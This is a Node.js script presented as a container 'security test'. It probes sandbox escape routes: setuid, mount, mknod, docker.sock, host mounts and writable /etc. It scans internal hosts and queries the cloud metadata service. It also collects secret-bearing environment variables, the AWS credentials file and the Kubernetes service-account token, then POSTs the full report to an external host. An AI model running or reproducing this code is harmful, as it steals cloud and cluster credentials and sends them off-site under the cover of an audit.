import http from "http";
import https from "https";
import fs from "fs";
import { execSync } from "child_process";
import os from "os";

const METADATA_HOST = "169.254.169.254";
const REPORT_HOST = "idms-reporting.mycrocloud.site";
const REPORT_PATH = "/api/report";

/* -------------------- Helpers -------------------- */

function request({ protocol = "http:", timeout = 3000, ...options }, body = null) {
  const lib = protocol === "https:" ? https : http;

  return new Promise((resolve) => {
    const req = lib.request(options, (res) => {
      let data = "";
      res.on("data", (c) => (data += c));
      res.on("end", () =>
        resolve({
          ok: true,
          statusCode: res.statusCode,
          body: data.slice(0, 1000),
        })
      );
    });

    req.on("error", (err) =>
      resolve({ ok: false, error: err.message })
    );

    req.setTimeout(timeout, () =>
      req.destroy(new Error("Request timeout"))
    );

    if (body) req.write(body);
    req.end();
  });
}

function safeExec(cmd) {
  try {
    return execSync(cmd, { stdio: "pipe" }).toString().trim();
  } catch (e) {
    return null;
  }
}

function safeRead(path, limit = 1000) {
  try {
    return fs.readFileSync(path, "utf8").slice(0, limit);
  } catch {
    return null;
  }
}

function exists(path) {
  try {
    fs.accessSync(path);
    return true;
  } catch {
    return false;
  }
}

/* -------------------- Security Tests -------------------- */

function getCapabilities() {
  const status = safeRead("/proc/self/status");
  return status?.split("\n").find(l => l.startsWith("CapEff")) || null;
}

function getSeccomp() {
  const status = safeRead("/proc/self/status");
  return status?.split("\n").find(l => l.startsWith("Seccomp")) || null;
}

function testSetuid() {
  try {
    safeExec("cp /bin/sh /tmp/testsh");
    safeExec("chmod u+s /tmp/testsh");
    const out = safeExec("ls -l /tmp/testsh");
    return out?.includes("s") || false;
  } catch {
    return false;
  }
}

function testWritableEtc() {
  try {
    fs.writeFileSync("/etc/.audit_test", "test");
    return true;
  } catch {
    return false;
  }
}

function checkDangerousDevices() {
  const devices = ["/dev/mem", "/dev/kmsg", "/dev/sda", "/dev/fuse"];
  return Object.fromEntries(devices.map(d => [d, exists(d)]));
}

function checkCgroupLimits() {
  const files = [
    "/sys/fs/cgroup/memory.max",
    "/sys/fs/cgroup/cpu.max",
    "/sys/fs/cgroup/pids.max"
  ];
  return Object.fromEntries(
    files
      .filter(exists)
      .map(f => [f, safeRead(f)])
  );
}

async function scanInternalNetwork() {
  const targets = [
    "10.0.0.1",
    "10.0.0.2",
    "172.16.0.1",
    "192.168.1.1",
    "kubernetes.default.svc",
  ];

  const result = {};
  for (const host of targets) {
    const r = await request({
      host,
      path: "/",
      method: "GET",
      timeout: 2000
    });
    result[host] = r.ok ? r.statusCode : r.error;
  }
  return result;
}

/* -------------------- Main -------------------- */

async function run() {
  const report = {
    timestamp: new Date().toISOString(),

    platform: {
      hostname: os.hostname(),
      platform: process.platform,
      arch: process.arch,
      nodeVersion: process.version,
    },

    user: {
      uid: process.getuid?.(),
      gid: process.getgid?.(),
      whoami: safeExec("whoami"),
    },

    privilege: {
      capabilities: getCapabilities(),
      seccomp: getSeccomp(),
      setuidWorks: testSetuid(),
      canMount: !!safeExec("mount -t tmpfs tmpfs /tmp/testmnt"),
      canMknod: !!safeExec("mknod /tmp/testnull c 1 3"),
      writableEtc: testWritableEtc(),
    },

    containerIsolation: {
      namespaces: safeExec("ls /proc/self/ns"),
      proc1Cgroup: safeRead("/proc/1/cgroup"),
      mountSample: safeRead("/proc/self/mountinfo"),
      dockerSock: exists("/var/run/docker.sock"),
      hostRootExists: exists("/host"),
      rootfsExists: exists("/rootfs"),
      dangerousDevices: checkDangerousDevices(),
    },

    secretsExposure: {
      envLeak: Object.fromEntries(
        Object.entries(process.env)
          .filter(([k]) =>
            /(AWS|KEY|SECRET|TOKEN|PASS|DB|DATABASE)/i.test(k)
          )
          .slice(0, 20)
      ),
      awsCredentialsFile: safeRead("/root/.aws/credentials"),
      k8sToken: safeRead(
        "/var/run/secrets/kubernetes.io/serviceaccount/token"
      ),
    },

    resourceLimits: {
      cgroup: checkCgroupLimits(),
      ulimit: safeExec("ulimit -a"),
      disk: safeExec("df -h"),
      processes: safeExec("ps aux | wc -l"),
    },

    network: {
      metadata: null,
      metadataError: null,
      internalScan: null,
      internetAccess: null,
    },

    reportPostStatus: null,
  };

  /* -------- IMDS Test -------- */
  const tokenRes = await request({
    host: METADATA_HOST,
    path: "/latest/api/token",
    method: "PUT",
    headers: { "X-aws-ec2-metadata-token-ttl-seconds": "60" },
  });

  if (tokenRes.ok && tokenRes.statusCode === 200) {
    const metaRes = await request({
      host: METADATA_HOST,
      path: "/latest/meta-data/",
      headers: { "X-aws-ec2-metadata-token": tokenRes.body },
    });
    report.network.metadata = metaRes.ok ? metaRes.body : metaRes.error;
  } else {
    report.network.metadataError =
      tokenRes.error || `Status ${tokenRes.statusCode}`;
  }

  /* -------- Network Tests -------- */
  report.network.internalScan = await scanInternalNetwork();

  report.network.internetAccess = await request({
    protocol: "https:",
    host: "registry.npmjs.org",
    path: "/",
    method: "GET",
  });

  /* -------- Reporting -------- */
  try {
    const postRes = await request(
      {
        protocol: "https:",
        host: REPORT_HOST,
        path: REPORT_PATH,
        method: "POST",
        headers: { "Content-Type": "application/json" },
      },
      JSON.stringify(report)
    );

    report.reportPostStatus =
      postRes.statusCode || postRes.error;
  } catch (e) {
    report.reportPostStatus = e.message;
  }

  console.log("==== SECURITY TEST RESULT ====");
  console.log(JSON.stringify(report, null, 2));
}

run();